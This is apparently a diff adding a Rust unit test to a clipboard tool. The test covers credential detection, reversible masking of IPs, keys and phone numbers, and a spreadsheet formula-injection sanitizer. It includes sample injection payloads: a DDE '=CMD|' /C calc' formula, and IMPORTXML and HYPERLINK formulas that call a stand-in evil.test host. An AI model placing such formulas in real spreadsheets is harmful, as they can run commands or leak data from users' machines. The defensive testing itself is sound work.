@@ -1519,4 +1519,81 @@ mod tests {
 
         let _ = fs::remove_dir_all(tmp_dir);
     }
+
+    #[test]
+    fn test_reversible_privacy_twin_spreadsheet_injection_and_sensitive_zero_undo() {
+        use crate::security::{
+            classify_sensitive_text, inspect_restorable_privacy_twins, mask_with_privacy_twins,
+            wipe_privacy_twins, SensitiveSecretKind,
+        };
+
+        wipe_privacy_twins();
+
+        // 1. 验证 2026 新型 AI/SaaS 凭据（Groq / Supabase / Docker PAT）识别与双向 AI 替身指代一致性
+        let groq_key = format!("{}{}", "gsk_", "AbCdEfGh1234567890IjKlMnOpQrStUvWx");
+        let docker_pat = format!("{}{}", "dckr_pat_", "ZyXwVuTsRqPoNmLkJiHgFeDcBa9876");
+        assert_eq!(
+            classify_sensitive_text(&groq_key),
+            Some(SensitiveSecretKind::ApiKey)
+        );
+        assert_eq!(
+            classify_sensitive_text(&docker_pat),
+            Some(SensitiveSecretKind::ApiKey)
+        );
+
+        let incident = format!(
+            "主节点 10.24.8.19 同步至从节点 10.24.8.20 超时（重试 10.24.8.19 失败），Key={groq_key}，电话 13812345678，邮箱 ops@acme.cn"
+        );
+        let (masked, cnt) = mask_with_privacy_twins(&incident).unwrap();
+        assert!(cnt >= 5);
+        assert!(!masked.contains(&groq_key));
+        assert!(!masked.contains("10.24.8.19"));
+        assert!(!masked.contains("13812345678"));
+        assert_eq!(masked.matches("[ICLIP_IP_1]").count(), 2);
+        assert!(masked.contains("[ICLIP_IP_2]"));
+
+        // 模拟复制 AI 回复，自动置顶 `restore-privacy-twin` 并无损还原真值
+        let ai_reply = "curl -H 'Authorization: Bearer [ICLIP_KEY_1]' http://[ICLIP_IP_1]:8080/failover?standby=[ICLIP_IP_2]&phone=[ICLIP_PHONE_1]";
+        let reply_actions = analyze_text_actions(ai_reply, false);
+        assert_eq!(reply_actions[0].id, "restore-privacy-twin");
+        let (restored, r_cnt) = inspect_restorable_privacy_twins(ai_reply).unwrap();
+        assert_eq!(r_cnt, 4);
+        assert_eq!(
+            restored,
+            format!("curl -H 'Authorization: Bearer {groq_key}' http://10.24.8.19:8080/failover?standby=10.24.8.20&phone=13812345678")
+        );
+
+        wipe_privacy_twins();
+        assert_eq!(inspect_restorable_privacy_twins(ai_reply), None);
+
+        // 2. 验证 OWASP CWE-1236 电子表格公式注入护盾（拦截危险公式且保留合法负数与电话）
+        assert_eq!(
+            crate::security::sanitize_spreadsheet_cell("=CMD|' /C calc'!A0"),
+            "'=CMD|' /C calc'!A0"
+        );
+        let risky_md = "| 字段 | 值 |\n| :--- | :--- |\n| 注入 | =IMPORTXML(\"https://evil.test\",\"//a\") |\n| 外带 | +HYPERLINK(\"https://evil.test\") |\n| 亏损 | -128.50 |\n| 号码 | +86-13800138000 |";
+        let tbl = analyze_table_bridge(risky_md);
+        let tsv = &tbl
+            .iter()
+            .find(|a| a.id == "tbl-md-to-excel")
+            .unwrap()
+            .result_text;
+        assert!(tsv.contains("'=IMPORTXML(\"https://evil.test\",\"//a\")"));
+        assert!(tsv.contains("'+HYPERLINK(\"https://evil.test\")"));
+        assert!(tsv.contains("\t-128.50"));
+        assert!(!tsv.contains("'-128.50"));
+        assert!(tsv.contains("\t+86-13800138000"));
+
+        // 3. 验证未收藏敏感凭据手动删除时跳过内存撤销栈（零残留）
+        let tmp_dir = std::env::temp_dir().join(format!(
+            "iclip-iter12-test-{}-{}",
+            std::process::id(),
+            crate::model::now_unix_secs()
+        ));
+        let mut store = ClipboardStore::new(tmp_dir.clone());
+        let sec_id = store.insert_or_promote(ClipItem::new_text(groq_key, None));
+        store.delete_by_id(&sec_id);
+        assert!(!store.has_active_undo(crate::model::now_unix_secs()));
+        let _ = fs::remove_dir_all(tmp_dir);
+    }
 }
